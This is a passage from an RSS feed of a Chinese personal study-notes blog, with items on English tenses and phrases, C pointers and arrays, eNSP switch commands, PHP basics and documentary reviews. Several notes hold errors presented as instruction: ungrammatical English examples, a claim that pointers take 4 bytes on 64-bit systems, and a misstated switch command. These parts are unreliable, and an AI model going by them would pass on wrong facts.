      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E5%8A%A8%E8%AF%8D%E7%9F%AD%E8%AF%AD%E5%92%8C%E4%BB%8B%E8%AF%8D%E7%9F%AD%E8%AF%AD/</guid>
      <description>动词短语和介词短语 它们的区别 动词短语 动词短语虽然由多个词语构成，但它实际上是一个整体，只能将它当作一个词语看待，因为它与普通的动词是一样的。
动词和介词构成的动词短语也叫复合动词，属于实义动词的范畴。
 look at get up look for  介词短语 介词短语的介词是放在开头的，后面跟一个名词/代词/数词/动名词/可以构成一个介词短语。
介词可以根据自身的规则构成很多个意义不同的介词短语，而动词短语是一个固定的实义动词，有固定的意思和作用。
介词短语是一个真正意义上的短语，
动词短语不属于短语，只是一个动词。
因为动词短语中的介词和介词短语中的介词看起来样的，所以，这很容易让我们将这两者混用。</description>
    </item>
    
    <item>
      <title>Window 无法使用 WIFI</title>
      <link>https://note.yxzi.xyz/note/technology/windows/window-%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8-wifi/</link>
      <pubDate>Sun, 03 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/windows/window-%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8-wifi/</guid>
      <description>就在今天，我的联想小新突然就没网了，点开右下角的网络标志一看，没想到 WIFI 的开关都直接消失了，直接给我干懵逼的了，转到设置一看，设置项的 WIFI 选项也很莫名的消失了，我也没更新系统，就用着用着就没 WIFI 了，属实是很怪。
然后我打开设备管理器看了一下，发现网络适配器中的 Intel(R) Wireless-AC 9569居然提示报错无法启动（代码 10）。
最后我在网上查了大概十分钟，就在知乎上找到了一个回答，很简单粗暴，也非常有用。
 首先将你笔记本的电源给拔掉。 然后可以尝试长按电源键，使电脑强制关机。 最后再开机，Wireless 就恢复了。  </description>
    </item>
    
    <item>
      <title>English 一般过去时态</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E4%B8%80%E8%88%AC%E8%BF%87%E5%8E%BB%E6%97%B6%E6%80%81/</link>
      <pubDate>Fri, 01 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E4%B8%80%E8%88%AC%E8%BF%87%E5%8E%BB%E6%97%B6%E6%80%81/</guid>
      <description>一般过去时态 表示的曾经发生的一些动作和状态，也就是已经过去的一些事物。
一般过去时态的时间状语 一般情况，一般过去时态需要加上表示过去的时间状语。
 yesterday. just now. before.  大部分表示过去的时间状语，都是由介词或副词跟其他的词语构成的，一般有下面一种构成方式。
在副词 ago（&amp;hellip;之前）加上表示时间的词语。 One/a/an + 表示时间名词的单数 + ago.
数词（大于 1 的数词） + 表示时间名词的复数 的复数 + ago.
 a day ago. One year ago. Three days ago.  在 in 后面加上一个表示过去年份的数词。  I was run in 2022. I was study in 2022.  在副词 last 后面加上表示时间的名词。 Last（上一个） + 表示时间的名词的单数。
 Last hour. Last week. Last month. I was tired last night. She was busy last week.</description>
    </item>
    
    <item>
      <title>C 一个指针变量占几个字节</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E4%B8%80%E4%B8%AA%E6%8C%87%E9%92%88%E5%8F%98%E9%87%8F%E5%8D%A0%E5%87%A0%E4%B8%AA%E5%AD%97%E8%8A%82/</link>
      <pubDate>Wed, 30 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E4%B8%80%E4%B8%AA%E6%8C%87%E9%92%88%E5%8F%98%E9%87%8F%E5%8D%A0%E5%87%A0%E4%B8%AA%E5%AD%97%E8%8A%82/</guid>
      <description>一个指针变量占几个字节 在 64 位系统中，一个指针变量占 4 个字节，不管这个指针指向的是什么类型的变量。
在 64 位系统中，一个指针变量占 8 个字节，不管这个指针指向的是什么类型的变量。
sizeof() 此函数可以返回指定数据类型所占的字节。
#include &amp;lt;stdio.h&amp;gt; int main () {  int a = 666;  char ch = &amp;#39;A&amp;#39;;  double dou = 99.9;  int*p = &amp;amp;a;  char *c = &amp;amp;ch;  double *x = &amp;amp;dou;  // 不过什么数据类型的指针变量，  // 所占字节都是 8 个（32 位系统占 4 个字节）  printf(&amp;#34;%d\n&amp;#34;,sizeof(p));  printf(&amp;#34;%d\n&amp;#34;,sizeof(c));  printf(&amp;#34;%d\n&amp;#34;,sizeof(x)); } 虽然在 64 位系统中的指针变量占 8 个字节，但是一个变量的地址（指针变量）只会存放该变量首字节的地址。这样，指针变量通过首字节的地址，就能知道自己所指向的变量类型，也就知道了该指针变量所指向的变量到底占多少个字节。</description>
    </item>
    
    <item>
      <title>C 动态分配内存</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E5%8A%A8%E6%80%81%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98/</link>
      <pubDate>Wed, 30 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E5%8A%A8%E6%80%81%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98/</guid>
      <description>动态内存分配 传统数组的缺点 传统数组也叫静态数组，也属于静态内存
  数组长度必须事先指定，且只能是长整数，不能是变量。
  传统形式定义的数组，该数组的内存无法被我们手动释放。因为系统为该数组分配的储存空间就会一直存在，除非数组所在的函数运行完毕，数组的空间才会被系统释放。
#include &amp;lt;stdio.h&amp;gt;void fun(void){  // 这 20 个字节（4 个 int ）的储存空间无法被我们手动的释放，  // 只能在本函数（fun 函数）运行完毕后由系统自动释放  int a[5] = {1,2,3,4,5}; } int main () {  }   数组的长度一旦定义，其长度就不能再被更改。也就是数组的长度不能在函数运行的过程中动态的扩充或缩小。
  Ａ 函数中定义的数组，在 Ａ 函数运行期间可以被其他函数使用，但 A 函数运行完毕之后，A 函数中的数组将无法在被其他函数使用（A 函数在运行完毕后，就会被系统释放）。
  动态数组（动态内存） 动态数组很好的解决了传统数组的 4 个缺点，传统数组也叫静态数组，</description>
    </item>
    
    <item>
      <title>English 一般现在时态</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E4%B8%80%E8%88%AC%E7%8E%B0%E5%9C%A8%E6%97%B6%E6%80%81/</link>
      <pubDate>Wed, 30 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E4%B8%80%E8%88%AC%E7%8E%B0%E5%9C%A8%E6%97%B6%E6%80%81/</guid>
      <description>一般现在时态 指的是从过去到现在直至将来的一段时间内发生的动作或存在的状态
一般现在时态的用法 当表示经常性、习惯性、有规律性的动作和状态的时候 另外，表示真理性、客观性的动作和状态也要使用一般现在时态。
比如：地球是圆的，太阳从东边升起，1 + 1 = 2.
表示不轻易改变的状态 什么叫不轻易改变的状态？比如：
“他是一个男孩”，“是男的”这个状态不会轻易变成“是女的”这个状态。
“这个房子很大”，因为大房子是不会轻易变小的，所以这也要用一般现在时态。
表示此时此刻的状态  I am tired now. I am busy now.  一般现在时态的时间状语 一般现在时态的时间状语都是表示经常性、习惯性或有规律性的词语。比如：
 every day every week On Sunday In the Morning  以上都是一些时间状语。
 She gets up very late on Sunday. I get up at 9:00 every morning. I never drink wine. I often play basketball.  </description>
    </item>
    
    <item>
      <title>English 时态是什么</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E6%97%B6%E6%80%81%E6%98%AF%E4%BB%80%E4%B9%88/</link>
      <pubDate>Mon, 28 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E6%97%B6%E6%80%81%E6%98%AF%E4%BB%80%E4%B9%88/</guid>
      <description>时态是什么 时态其实就是一个谓语动词随着时间的变化而发生不同形态的变化。
不同的时态用来表示不同的时间状态。
 I bought a book yesterday. I will a book tomorrow. I buy a book ever day.  可以看出，英语的谓语动词发生了多种形式的变化：bought、will buy、buy，另外中文的时间状语放在中间，而英文的时间状语放在句尾（是少数情况下也会放在句尾，比如书面语）。
英语中有 16 种时态。常用的有 10 种：
 一般现在时态 一般过去时态 一般将 来时态 现在进行时态 现在完成时态 过去完成时态 过去将来时态 过去进行时态 现在完成进行时态 将来进行时态  其他的六种比较少用，主要出现在书面语中。</description>
    </item>
    
    <item>
      <title>C 一维数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84/</link>
      <pubDate>Thu, 24 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84/</guid>
      <description>一维数组 定义一个一维数组时：
为 n 个变量连续分配储存空间。
数组中的所有元素，数据类型必须一致。
数组中所有变量所占的字节必须一样。
定义一维数组 #include &amp;lt;iostream&amp;gt;int main(){  // 完全初始化  int arr[5] ={1,2,3,4,5};  // 不完全初始化，未初始化的元素的值为 0  int arr2[5] ={1,2,3};  // 打印索引为 4 的值，但 arr2 中没有索引为 3 的值，因此这里返回 0  printf(&amp;#34;%d\n&amp;#34;,arr2[3]);  // 不初始化，所有元素都是垃圾值  int arr3[5];  printf(&amp;#34;%d\n&amp;#34;,arr3[5]);  // 清零，将数组中的每个元素的值都变成 0  int arr4[5] = {0}; } 错误的定义 只有在定义数组的同时，才可以整体赋值，
其他情况下整体复制都是错误的。
#include &amp;lt;iostream&amp;gt;int main(){  int a[5];  // a[5] 表示 a 数组中索引为 5 的值。  a[5] = {1,2,3,4,5}; } 将数组 a 中的值全部复制到数组 b #include &amp;lt;iostream&amp;gt; int main() { // 错误的写法，因为一维数组名，d该数组中第一个元素的地址  b = a; // 正确的写法  for(int i = 0; i &amp;lt; 5; i++ )  {  b[i] = a[i];  } } </description>
    </item>
    
    <item>
      <title>C 二维数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</link>
      <pubDate>Thu, 24 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</guid>
      <description>二维数组 一个二维数组，在本质上，是一个一维数组的列表。它声明了一个 x 行 y 列的二维整型数组。
#include &amp;lt;iostream&amp;gt; int main(){  // 该数组中总共有12个元素，可以当作 3 行(一)5 列（丨）来看  int arr[3][4];  // 这个二位数组以此为：  arr[0][0] arr[0][1] arr[0][2] arr[0][3]  arr[1][0] arr[1][1] arr[1][2] arr[1][3]  arr[2][0] arr[2][1] arr[2][2] arr[2][3] } 声明一个二维数组 #include &amp;lt;iostream&amp;gt; int main() {  int arr[3][4] = {1,2,3,4,6,7,8,9,10,11,12};   int arr2[3][4] =  {  {1, 2, 3, 4},  {5, 6, 7, 8},  {9,10,11,12}  }; } 输出二维数组的内容 #include &amp;lt;iostream&amp;gt; int main() {  int arr[3][4] =  {  {1, 2, 3, 4},  {5, 6, 7, 8},  {9,10,11,12}  };  int i,j;  for(i = 0; i &amp;lt; 3; ++i)  {  for(j = 0; j &amp;lt; 4; ++j)  { // 负号表示将输出的内容对其， // 3表示每个元素间隔3个光标到位置  printf(&amp;#34;%-3d &amp;#34;,arr[i][j]);  }  printf(&amp;#34;\n&amp;#34;);  } } 关于多维数组 不存在多维数组，因为内存是线性的</description>
    </item>
    
    <item>
      <title>C 指针和一维数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88%E5%92%8C%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84/</link>
      <pubDate>Thu, 24 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88%E5%92%8C%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84/</guid>
      <description>指针和一维数组 一维数组名 一维数组的名字是一个指针常量，它存放的是数组一个元素的地址。
#include &amp;lt;iostream&amp;gt; int main() {  int a[5];  // 打印一维数组 a 中，第一个元素的地址  printf(&amp;#34;%#x\n&amp;#34;,&amp;amp;a[0]);  // 打印一维数组 a 的名字  printf(&amp;#34;%#x\n&amp;#34;,a); } 下标和指针的关系 如果 p 是一个指针变量，则 p[n] 永远等价于 *（p + n）
void DeterminesArray(int *arr, int lenght) {  for(int i = 0; i &amp;lt; lenght; i++)  {  printf(&amp;#34;%d\n&amp;#34;,*(arr + i));  // *(arr + i) 等价于 arr[i]  printf(&amp;#34;%d\n&amp;#34;,arr[i]);  } } 确定一个一维数组需要哪些参数 当一个函数要处理一个或多个一维数组时，我们需要接收该数组的那些信息。也就是如何让一个函数知道我们将要处理的是一个数组，而不是其他数据类型。</description>
    </item>
    
    <item>
      <title>C 指针的运算</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88%E7%9A%84%E8%BF%90%E7%AE%97/</link>
      <pubDate>Thu, 24 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88%E7%9A%84%E8%BF%90%E7%AE%97/</guid>
      <description>指针的运算 指针变量不能相加不能相乘也不能相除。 如果两个指针变量指向的是同一块连续空间中的不同存储单元（比如数组），则这两个指针变量才可以相减（表示两个元素相隔多少个元素/字节）</description>
    </item>
    
    <item>
      <title>eMSP 配置 trunk 和 Access</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ensp/%E9%85%8D%E7%BD%AE-trunk-%E5%92%8C-access/</link>
      <pubDate>Mon, 21 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ensp/%E9%85%8D%E7%BD%AE-trunk-%E5%92%8C-access/</guid>
      <description>配置 trunk 和 Access 添加静态 mac
改名，配置 IP 和子网掩码
第一台 pc ping 其他 pc
显示 mac 地址
设置 mac 地址
划分 vlan
改名
显示 vlan
其中一台 pc ping 剩余 pc
创建 vlan batch 1
进入接口 1 和 2
port link-type access
port defult vlan 10
quit
进入接口 3 和 4
port link-type access
port defult vlan 20
quit
相同 vlan 互相 ping
两台交换机分别有四台 pc
第一台交换机下有 vlan 10 和 vlan 20</description>
    </item>
    
    <item>
      <title>eNSP 交换机端口模式</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ensp/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Mon, 21 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ensp/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%A8%A1%E5%BC%8F/</guid>
      <description>交换机端口模式 Access 接收，没有 vid 的帧打上 tag，有 vid 的帧则比较 vid 和 vpvid，相同，则剥离 vid 转发，不同则丢弃
发送，vid 等于 pvid 剥离 vid 并发送，不等于 则丢弃
trunk 接收，没有 vid 的帧，打上 pvid 标签，查询是否在允许列表中，如果在，则转发，不在则丢弃。有 vid 的帧，直接查询是否在允许列表中，在则转发，不在则丢弃
发送，vid 在允许列表内，vid 等于 pvid 剥离 vid 并发送，
vid 不等于 pvid，保留 vid 并转发
vid 不在运行列表，直接丢弃
hybrid 接收，同 trunk，
发送
vid 不在允许列表中，直接丢弃
vid 在运行列表中，不管 vid 是否等于 pvid，都需要通过命令决定是否保留这个 vid （tagged 和 untagged）
启用 gvrp 必须是 trunk</description>
    </item>
    
    <item>
      <title>eNSP 路由命令</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ensp/%E8%B7%AF%E7%94%B1%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Mon, 21 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ensp/%E8%B7%AF%E7%94%B1%E5%91%BD%E4%BB%A4/</guid>
      <description>路由命令 system-view 系统界面
current- 当前配置
undo info-center enable（删除或禁用 xx）
sysname Namr 重命名设备
display vlan 查看 vlan
display interface 显示交换机的所有接口信息
display interface 接口名
display this 显示当前端口信息
display vlan 显示 vlan
vlan
display port vlan 显示 vlan
quit 退出
save 保存
reboot 重启设备
reset save-configuration 选择 y or n 重置设备配置
display mac-address 显示 mac 地址
display interface Ethernet brief 以太网摘要情况
undo negotiation auto 开启接口自动协商功能
duplex full 设置双工模式
speeed 100 修改接口速率
mac-address static 0099-cd11-1111 Eth 接口 vlan 1</description>
    </item>
    
    <item>
      <title>eNSP 配置 Web 服务器</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ensp/%E9%85%8D%E7%BD%AE-web-%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
      <pubDate>Mon, 21 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ensp/%E9%85%8D%E7%BD%AE-web-%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
      <description>配置 Web 服务器 第一台客户机 10.0.1.10
10.0.1.1
域名服务器
10.0.2.10
Server
10.0.2.10
10.0.2.1
域名服务器
10.0.2.10
配置 router
sys
int e 0/0/0
ip add 10.0.2.1 255.255.255.0
quit
int g0/0/0
ip add 10.0.1.1 255.255.255.0
quit
save
配置 lsw
sys
int g0/0/1
port link type access
quit
int g0/0/2
port link type trunk
打开 client
目的 10.0.2.10
打开 Server
目的 10.0.1.10
新建本地
创建文件夹 ftp 和 http
新建 flag.txt
新建 index.html
分别启动
打开 Server
服务器信息
ftp 选择文件根目录</description>
    </item>
    
    <item>
      <title>私有地址</title>
      <link>https://note.yxzi.xyz/note/technology/internet/%E7%A7%81%E6%9C%89%E5%9C%B0%E5%9D%80/</link>
      <pubDate>Mon, 21 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/%E7%A7%81%E6%9C%89%E5%9C%B0%E5%9D%80/</guid>
      <description>私有地址 私有 IP 地址是一段保留的 IP 地址。只使用在局域网中，无法在 Internet 上使用。
NAT－Network Address Translation 网络地址转换
私有地址范围： A 类 10.0.0.0/8， 即 10.0.0.0&amp;ndash;10.255.255.255
B 类 172.16.0.0/12， 即 172.16.0.0&amp;ndash;172.31.255.255
C 类 192.168.0.0/ 16， 即 192.168.0.0&amp;ndash;192.168.255.255</description>
    </item>
    
    <item>
      <title>English 英语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%8B%B1%E8%AF%AD/</link>
      <pubDate>Mon, 14 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%8B%B1%E8%AF%AD/</guid>
      <description>英语中的很多单词都有格式变化，喜欢用变化来表达一个词语的不同意义，这是英语的一大特点。
时态是英语语法的一大特色，也是和中文语法最大的区别之一</description>
    </item>
    
    <item>
      <title>PHP 数据类型</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Thu, 10 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid>
      <description>数据类型 在 PHP 中，指的是一个变量所存储的数据本身的类型，而不是变量的类型，即变量本身是没有数据类型的。
基本数据类型 int/integer 占 4 个字节，表示整数类型，前提是存的下，当整型存不下的时候，将会变为 double 类型。
PHP 中提供了四种整型的定义方式：十进制定义、二进制定义、八进制定义和十六进制定义。
// 十进制 $decimal = 20;  // 二进制 $Binary = 10100;  // 八进制 $Octal = 1747;  // 十六进制 $HexaDecimal = 0x3E7;  echo $decimal . &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; echo $Binary . &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; echo $Octal . &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; echo $HexaDecimal . &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; float/double 占 8 个字节，表示小数或者是整型所存不下的整数。
string 所占字节根据长度分配，表示字符串。
bool/boolean 表示 true 或 false.
复合数据类型 object 存放对象。
array 次性存放多个数据。
特殊数据类型 resource 存放资源数据，比如 PHP 外部数据（数据库、文件等）</description>
    </item>
    
    <item>
      <title>PHP 常量</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E5%8F%98%E9%87%8F/%E5%B8%B8%E9%87%8F/</link>
      <pubDate>Wed, 09 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E5%8F%98%E9%87%8F/%E5%B8%B8%E9%87%8F/</guid>
      <description>常量 顾名思义，指的是不能被改变的变量。
在 PHP 中，常量有两种定义方式（5.3 之后才有两种）
定义 define() define(&amp;#39;PI&amp;#39;, 3.14); echo PI, &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; const() const PII = 18; echo PII; 定义特殊常量
define(&amp;#39;-_-&amp;#39;, &amp;#39;smile&amp;#39;); // 输出失败 // echo -_-; // 输出成功 echo constant(&amp;#39;-_-&amp;#39;); 这种特殊符号的常量无法用 一般的方式来输出，必须使用 constant() 来输出。
命名规则  常量不需要使用 $ 符号，因为一旦使用 $，系统就会认为这是变量。 常量的名字组成由字母、 数字和下划线组成，不能以数字开头。 常量的名字通常是以大写字母为主（主要是与变量以示区别）。 常量命名的规则比变量要松散， 可以使用一些特殊字符，但该方式只能使用 define 定义。  常量和变量的使用  数据可能变化的， 那么肯定是用变量。 数据不一定会变的，可以使用常量或者变量（变量居多） 数据不允许被修改的， 务必用常量。  系统常量 PHP_ VERSION：PHP 版本号。 PHP INT SIZE**：整型数据所占的字节数。 PHP_ INT_MAX：整型能表示的最大值（PHP 中整型是允许出现负数的）
系统魔术常量 在 PHP 中，还有一些特殊的系统常量，他们由 __ 开始 + 常量名 + __，这种常量称之为系统魔术常量。</description>
    </item>
    
    <item>
      <title>PHP 环境配置</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Wed, 02 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</guid>
      <description>环境配置 下载 PHPStudy PHPStudy 是一个 windows 下的 Apache/Ngnix+PHP+MySQL 的集成开发环境
 解压运行 选择安装目录，通常时 D 盘，我这里是D:\AppInstallPath\PhpStudy  安装完成后，打开 PHPStudy，会出现以下界面：
![下载 PHPStudy](.assets/下载 PHPStudy.png)
另外，PHPStudy 会在安装目录下的 phpstudy_pro\Extensions 路径形成目录结构：
![image-20220303002959290](E:\Github\MyBlog\content\mynote\4 Specialty\Language\PHP\PHP 环境配置.assets\image-20220303002959290.png)
在这里我们只需要注意 MySql 和 php 的路径，因为之后我们会用到这两个路径来配置环境变量。
配置 MySQL 环境变量  此电脑 — 系统属性 — 高级系统设置 — 高级 — 环境变量 。 找到系统变量中名为 Path 的变量， 新建，将 MySql 目录下的 bin 文件的路径粘贴到这里，确定。 win + R 打开 cmd，输入 mysql，如果提示ERROR 2003 (HY000): Can&#39;t connect to MySQL server on &#39;localhost&#39; (10061)就说明 MySQL 的环境变量配置完成。  !</description>
    </item>
    
    <item>
      <title>《亿万富翁们的饕餮盛宴》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E4%BA%BF%E4%B8%87%E5%AF%8C%E7%BF%81%E4%BB%AC%E7%9A%84%E9%A5%95%E9%A4%AE%E7%9B%9B%E5%AE%B4/</link>
      <pubDate>Sat, 26 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E4%BA%BF%E4%B8%87%E5%AF%8C%E7%BF%81%E4%BB%AC%E7%9A%84%E9%A5%95%E9%A4%AE%E7%9B%9B%E5%AE%B4/</guid>
      <description>《亿万富翁们的饕餮盛宴》 这天晚上，我看了两部纪录片，其中一部是《骄奢父母》，另一部就是现在这部《亿万富豪们的饕餮盛宴》了。
看了这部纪录片后，其实也没啥好写的，影片中大多都是介绍一些富人们所吃过的一些食物，
比如 5000 英镑一小口的古董酒、24000 英镑的鱼子酱等等等，虽然但是，
影片中还是有一些有意思的观点的，其中让我印象深刻的观点就是：
 这些人并不在意这些食物本身的价值，而在意的是这些食物背后的故事。
亿万富翁们想享有独一无二的东西。
重要的不是价格，而是你花钱买一些东西的感受。
 说两个印象比较深的两样东西吧，
第一种是一种长在海崖附近的什么狗爪螺来着，这玩意可能本事不是特别好吃，营养价值也一般，但为什么可以卖的这么贵？
因为这玩意是很多人冒着生命危险才能弄到的食物，这就是它的价值，单论它背后的故事，就很让人热血澎湃了。
另外一样就是一杯昂贵的古董酒，一杯 5000 英镑。酒瓶里，仅仅只剩下近乎是只有一下口的量，然而就是这一小口，值 5000 英镑，
卖家是这样说的，能喝这杯酒的人，不仅要有钱，还要有不凡的身份地位，最后这一小口酒就被一个有钱有权的中年男子喝掉了。
我这样的穷逼肯定是无法理解这些富人们的操作的，毕竟这确实是只有一小口，在高脚杯里近乎可以忽略&amp;hellip;</description>
    </item>
    
    <item>
      <title>C 递归</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%87%BD%E6%95%B0/%E9%80%92%E5%BD%92/</link>
      <pubDate>Thu, 24 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%87%BD%E6%95%B0/%E9%80%92%E5%BD%92/</guid>
      <description>递归 函数自身调用自身。</description>
    </item>
    
    <item>
      <title>《娇奢父母》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E5%A8%87%E5%A5%A2%E7%88%B6%E6%AF%8D/</link>
      <pubDate>Thu, 24 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E5%A8%87%E5%A5%A2%E7%88%B6%E6%AF%8D/</guid>
      <description>钱，是体验这世界美好事物的必需品。
这天晚上，因为四天没洗澡的原因，晚上就去洗了个澡，因此我就没锻炼和跑步，虽然已经快五天没跑步了，但确实是因为前几天的天气不太给力的原因——下雪&amp;hellip;
洗完澡，我就打开电脑，心血来潮的点开之前知乎收藏的三个纪录片，这天晚上我只看了两个，
因为剩下的那个没看的，需要开大会员我靠&amp;hellip;这玩意也是需要 15 块大洋的&amp;hellip;我又因为经济的原因止步于此了。
现在我所写的是名为《骄奢父母》的这个纪录片，我觉得这个纪录片很适合穷人或者一些有经济水平的人观看，
为什么这么说，因为我觉得这可以帮助我们了解上流社会，这里用上流社会可以还是有些不恰当，应该用顶流一词比较好。
这个记录片让我有幸看到了那些亿万富翁是如何培养自己的小孩的。
负责接送孩子上下学的司机、保镖，
家庭保姆、厨师、、营养师，甚至还有专门教小孩使用坐便器的老师，
世界顶尖的教授一对一教学，
私人订制的鞋，
职业的肖像画师，
他们住的地方不是小区、公寓、高楼大厦。
而是城堡或私人别墅，一个拥有几十个房间的城堡，而城堡之外、是广阔的草坪。
这些富豪们的孩子，大部分都很有教养，长得很好看，兴趣很广，当然，也有调皮捣蛋的。
孩子们穿的也都是我们尔等凡人能想象到的，一件貂皮大衣 5000 英镑，换算人民币就是四万两千多，高定的鞋子···</description>
    </item>
    
    <item>
      <title>C 函数</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0/</link>
      <pubDate>Wed, 23 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0/</guid>
      <description>函数 每个 C 程序都至少有一个函数，即主函数 main() ，所有简单的程序都可以定义其他额外的函数。
函数还有很多叫法，比如方法、子例程或程序，等等。
#include &amp;lt;iostream&amp;gt; // void 表示这个 max 函数没有返回值（但可以有 reture，但不能 reture 表达式） void max(int i,int j) {  if(i &amp;gt; j)  {  printf(&amp;#34;%d\n&amp;#34;,i);  }  else  {  printf(&amp;#34;%d\n&amp;#34;,j);  } }  // int 表示 main 函数返回一个整型的值 // 程序从 main 函数进入 void 表示该函数不能接收参数。 int main(void) {  int a = 1;  int b = 5;  max(a,b); } 优点  避免了重复性的操作。 有利于程序的模块化。  特点 能够接受参数，（但也可以不接收）</description>
    </item>
    
    <item>
      <title>C 数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E6%95%B0%E7%BB%84/</link>
      <pubDate>Mon, 21 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E6%95%B0%E7%BB%84/</guid>
      <description>数组 数组是用于储存多个相同类型数据的集合。
在 C 语言中，与数组相关的方法很少，大部分操作，都只能自己去实现，比如排序，查找等等。
